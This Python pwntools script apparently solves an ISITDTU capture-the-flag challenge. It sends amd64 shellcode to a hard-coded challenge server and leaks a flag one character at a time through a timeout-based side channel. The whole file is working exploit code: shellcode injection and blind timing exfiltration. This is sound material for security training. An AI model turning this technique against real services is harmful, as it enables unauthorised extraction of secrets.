from pwn import *
import string
import threading
import time

table = string.printable[:-5]
#table = "abc"
flag = "ISITDTU{"

def worker(shellcode):
    global flag
    #sock = remote("localhost", 2222)
    sock = remote("209.97.162.170", 2222)
    assert len(shellcode) < 0x46
    sock.sendline(shellcode)
    if "timeout" in sock.recv(timeout=5):
        flag += c
    sock.close()

while True:
    thlist = []
    x = len(flag)
    for c in table:
        shellcode = asm("""
        // rdi = XOR KEY
        mov rsi, 0xcafe000
        mov rdi, [rsi]
        mov rbx, 0x7b55544454495349
        xor rdi, rbx
        // shift key
        xor rbx, rbx
        mov al, {x}
        mov bl, 8
        div rbx
        imul rdx, rbx
        mov rcx, rdx
        shr rdi, cl
        // compare
        mov al, [rsi + {x}]
        xor rax, rdi
        cmp al, {c}
        jz loop
        xor rdi, rdi
        inc edi
        mov rax, 0x25
        syscall
        loop:
        jmp loop
        """.format(x=x, c=ord(c)), arch="amd64")
        #print(disasm(shellcode, arch="amd64"))
        th = threading.Thread(target=worker, args=([shellcode]))
        thlist.append(th)
        th.start()
        time.sleep(0.1)
    for th in thlist:
        th.join()
    print(flag)
    time.sleep(1)
